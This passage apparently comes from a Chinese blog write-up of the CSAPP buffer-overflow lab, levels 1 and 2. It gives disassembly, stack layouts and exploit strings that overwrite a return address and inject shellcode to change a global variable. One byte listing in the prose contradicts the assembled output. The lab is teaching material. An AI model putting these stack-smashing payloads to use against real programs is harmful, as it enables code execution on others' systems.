+&lt;/div&gt;
+&lt;/div&gt;&lt;h3 id=&#34;level-1sparker&#34;&gt;level 1：Sparker
+&lt;/h3&gt;&lt;p&gt;目标：调用fizz函数，并且通过传递自己的cookie值作为参数，以此来通过验证&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;08048c42 &amp;lt;fizz&amp;gt;:
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; 8048c42:	55                   	push   %ebp
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; 8048c43:	89 e5                	mov    %esp,%ebp
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; 8048c45:	83 ec 18             	sub    $0x18,%esp
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; 8048c48:	8b 45 08             	mov    0x8(%ebp),%eax
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; 8048c4b:	3b 05 08 d1 04 08    	cmp    0x804d108,%eax
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; 8048c51:	75 26                	jne    8048c79 &amp;lt;fizz+0x37&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; 8048c53:	89 44 24 08          	mov    %eax,0x8(%esp)
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; 8048c57:	c7 44 24 04 ee a4 04 	movl   $0x804a4ee,0x4(%esp)
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; 8048c5e:	08 
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; 8048c5f:	c7 04 24 01 00 00 00 	movl   $0x1,(%esp)
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; 8048c66:	e8 55 fd ff ff       	call   80489c0 &amp;lt;__printf_chk@plt&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; 8048c6b:	c7 04 24 01 00 00 00 	movl   $0x1,(%esp)
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; 8048c72:	e8 04 07 00 00       	call   804937b &amp;lt;validate&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; 8048c77:	eb 18                	jmp    8048c91 &amp;lt;fizz+0x4f&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; 8048c79:	89 44 24 08          	mov    %eax,0x8(%esp)
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; 8048c7d:	c7 44 24 04 40 a3 04 	movl   $0x804a340,0x4(%esp)
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; 8048c84:	08 
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; 8048c85:	c7 04 24 01 00 00 00 	movl   $0x1,(%esp)
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; 8048c8c:	e8 2f fd ff ff       	call   80489c0 &amp;lt;__printf_chk@plt&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; 8048c91:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; 8048c98:	e8 63 fc ff ff       	call   8048900 &amp;lt;exit@plt&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;栈结构示意图：&lt;/p&gt;
+&lt;table&gt;
+  &lt;thead&gt;
+      &lt;tr&gt;
+          &lt;th style=&#34;text-align: left&#34;&gt;地址&lt;/th&gt;
+          &lt;th style=&#34;text-align: left&#34;&gt;解释&lt;/th&gt;
+      &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+      &lt;tr&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;ebp + 8 字节&lt;/td&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;val&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;返回地址&lt;/td&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;应当为 fizz 的首地址&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;ebp&lt;/td&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;占4字节&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;&amp;hellip;&lt;/td&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;&amp;hellip;&lt;/td&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;ebp-40字节&lt;/td&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;buf数组的初始地址&lt;/td&gt;
+      &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;同样是在buf中插入cookie值，注意函数参数在函数返回地址之前，所以，cookie值应该插入在ebp+8起始的八个字节中，所以在 exploit.txt 中填入如下答案即可：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;00 00 00 00 00 00 00 00
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;00 00 00 00 00 00 00 00
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;00 00 00 00 00 00 00 00
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;00 00 00 00 00 00 00 00
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;00 00 00 00 00 00 00 00
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;00 00 00 00 42 8c 04 08
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;00 00 00 00 86 07 ce 2b 
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;chenyuan1125.github.io/p/csappbuffer%E5%AE%9E%E9%AA%8C/assets/image-20240228165816937.png&#34;
+	width=&#34;1663&#34;
+	height=&#34;185&#34;
+	srcset=&#34;chenyuan1125.github.io/p/csappbuffer%E5%AE%9E%E9%AA%8C/assets/image-20240228165816937_hu4346268438043317495.png 480w, chenyuan1125.github.io/p/csappbuffer%E5%AE%9E%E9%AA%8C/assets/image-20240228165816937_hu10660655700515630377.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;图3&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;898&#34;
+		data-flex-basis=&#34;2157px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;h3 id=&#34;level2firecracker&#34;&gt;level2：Firecracker
+&lt;/h3&gt;&lt;p&gt;目标：调用bang函数，并且修改global_value为自己的cookie值&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;08048c9d &amp;lt;bang&amp;gt;:
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; 8048c9d:	55                   	push   %ebp
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; 8048c9e:	89 e5                	mov    %esp,%ebp
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; 8048ca0:	83 ec 18             	sub    $0x18,%esp
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; 8048ca3:	a1 00 d1 04 08       	mov    0x804d100,%eax
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; 8048ca8:	3b 05 08 d1 04 08    	cmp    0x804d108,%eax
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; 8048cae:	75 26                	jne    8048cd6 &amp;lt;bang+0x39&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; 8048cb0:	89 44 24 08          	mov    %eax,0x8(%esp)
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; 8048cb4:	c7 44 24 04 60 a3 04 	movl   $0x804a360,0x4(%esp)
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; 8048cbb:	08 
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; 8048cbc:	c7 04 24 01 00 00 00 	movl   $0x1,(%esp)
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; 8048cc3:	e8 f8 fc ff ff       	call   80489c0 &amp;lt;__printf_chk@plt&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; 8048cc8:	c7 04 24 02 00 00 00 	movl   $0x2,(%esp)
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; 8048ccf:	e8 a7 06 00 00       	call   804937b &amp;lt;validate&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; 8048cd4:	eb 18                	jmp    8048cee &amp;lt;bang+0x51&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; 8048cd6:	89 44 24 08          	mov    %eax,0x8(%esp)
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; 8048cda:	c7 44 24 04 0c a5 04 	movl   $0x804a50c,0x4(%esp)
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; 8048ce1:	08 
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; 8048ce2:	c7 04 24 01 00 00 00 	movl   $0x1,(%esp)
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; 8048ce9:	e8 d2 fc ff ff       	call   80489c0 &amp;lt;__printf_chk@plt&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; 8048cee:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; 8048cf5:	e8 06 fc ff ff       	call   8048900 &amp;lt;exit@plt&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;已知变量的内存地址，我们可以通过插入恶意代码来修改变量的值，汇编代码如下：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-s&#34; data-lang=&#34;s&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# 改变 global_value&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;movl&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x2bce0786&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x804d100&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# 将 bang 函数的首地址压入栈&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;pushl&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x08048c9d&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;ret&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;接下来就是将汇编语言转换成十六进制的机器代码了。使用&lt;code&gt;gcc -m32 -c&lt;/code&gt; 和 &lt;code&gt;objdump -d&lt;/code&gt;可以得到转换之后的文件：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;00000000 &amp;lt;.text&amp;gt;:
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   0:	c7 05 00 d1 04 08 86 	movl   $0x2bce0786,0x804d100
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   7:	07 ce 2b 
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   a:	68 9d 8c 04 08       	push   $0x8048c9d
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   f:	c3                   	ret    
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;那么所有的字节就是 &lt;code&gt;c7 05 00 d1 04 08 70 5a 2d 36 68 9d 8c 04 08 c3&lt;/code&gt;。接下来回到 getbuff 的汇编代码：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;080491f4 &amp;lt;getbuf&amp;gt;:
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; 80491f4:	55                   	push   %ebp
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; 80491f5:	89 e5                	mov    %esp,%ebp
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; 80491f7:	83 ec 38             	sub    $0x38,%esp
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; 80491fa:	8d 45 d8             	lea    -0x28(%ebp),%eax
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; 80491fd:	89 04 24             	mov    %eax,(%esp)
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; 8049200:	e8 f5 fa ff ff       	call   8048cfa &amp;lt;Gets&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; 8049205:	b8 01 00 00 00       	mov    $0x1,%eax
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; 804920a:	c9                   	leave  
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; 804920b:	c3                   	ret  
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;构造栈的结构：&lt;/p&gt;
+&lt;table&gt;
+  &lt;thead&gt;
+      &lt;tr&gt;
+          &lt;th style=&#34;text-align: left&#34;&gt;地址&lt;/th&gt;
+          &lt;th style=&#34;text-align: left&#34;&gt;解释&lt;/th&gt;
+      &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+      &lt;tr&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;0x55683e78&lt;/td&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;入侵代码的起始地址，也就是调用get函数前eax寄存器的值&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;ebp&lt;/td&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;&amp;hellip;&lt;/td&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;ret&lt;/td&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;push $0x08048c9d&lt;/td&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;0x08048c9d为bang函数的起始地址&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;movl $0x2bce0786,0x804d100&lt;/td&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;0x804d100为global_value变量的内存地址，0x2bce0786为hack对应的cookie值,当前地址为buf数组的初始地址 rsp-40字节&lt;/td&gt;
+      &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;结合以上信息，构造下列答案：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;c7 05 00 d1 04 08 86 07
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ce 2b 68 9d 8c 04 08 c3
